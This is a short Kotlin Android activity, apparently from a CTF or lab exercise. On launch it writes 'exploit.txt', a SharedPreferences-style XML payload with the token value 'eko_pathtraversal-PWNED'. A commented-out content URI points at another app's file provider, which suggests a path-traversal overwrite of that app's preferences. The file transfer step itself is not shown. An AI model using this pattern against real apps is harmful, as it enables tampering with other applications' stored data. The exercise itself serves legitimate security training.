package com.example.mekato

import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.StrictMode
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.io.IOException

class MainActivity : AppCompatActivity() {
    @SuppressLint("Range")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        crearArchivo()

    }



    //val uri = Uri.parse("content://com.example.paila.files/hola.txt")

    fun crearArchivo() {
        try {
            val fileName = "exploit.txt"
            val fileContents = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
                    "<map>\n" +
                    "    <string name=\"token\">eko_pathtraversal-PWNED</string>\n" +
                    "</map>"

            val file = File(filesDir, fileName)
            val fileOutputStream = FileOutputStream(file)

            fileOutputStream.write(fileContents.toByteArray())
            fileOutputStream.close()

            // El archivo "hola.txt" con el contenido "Hola mundo" ha sido creado en filesDir.
        } catch (e: IOException) {
            e.printStackTrace()
            // Maneja cualquier excepción que pueda ocurrir durante la creación del archivo.
        }

    }
}